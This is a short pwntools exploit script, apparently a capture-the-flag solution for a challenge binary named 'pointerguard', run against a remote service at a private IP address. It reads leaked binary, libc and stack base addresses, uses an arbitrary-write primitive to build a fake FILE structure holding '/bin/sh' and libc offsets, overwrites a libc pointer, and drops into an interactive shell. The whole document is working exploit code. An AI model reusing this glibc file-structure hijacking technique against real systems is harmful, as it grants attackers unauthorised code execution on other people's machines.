from pwn import *
context.log_level='debug'
#p = process('pointerguard')
p = remote("172.16.11.101", 20001)
p.recvuntil('binary_base=')
bin_base = eval(p.recvuntil('\n')[:-1])
p.recvuntil('libc_base=')
libc_base = eval(p.recvuntil('\n')[:-1])
p.recvuntil('stack_base=')
stack_base = eval(p.recvuntil('\n')[:-1])
p.recvuntil('somewhere?')
p.sendline('Yes! I want!')
def write(addr,value):
    p.recvuntil(':')
    p.sendline(str(addr))
    p.recvuntil(':')
    p.sendline(str(value))
    p.recvuntil('')

def ret():
    p.sendline('return')

def exit():
    p.sendline('exit')

def printf(v):
    p.sendline('printf')
    p.sendline(v)

def malloc(size):
    p.sendline('malloc/free')
    p.sendline(str(size))

raw_input()
base = 0x23330200
write(base,u64('/bin/sh\x00'))
write(base+0x30,0x7fffffffffffffff)
write(base+0x38,libc_base+0x18cd17)
write(base+0x40,libc_base+0x18cd17)
write(base+0x88,libc_base+0x3c6780)
write(base+0xc0,0xffffffffffffffff)
write(base+0xd8,base+0xe0)
write(base+0xe0+0x38,libc_base+0x45390)
#write(base+0xe8,libc_base+0x45390)
write(libc_base+0x3C5708,base)
p.interactive()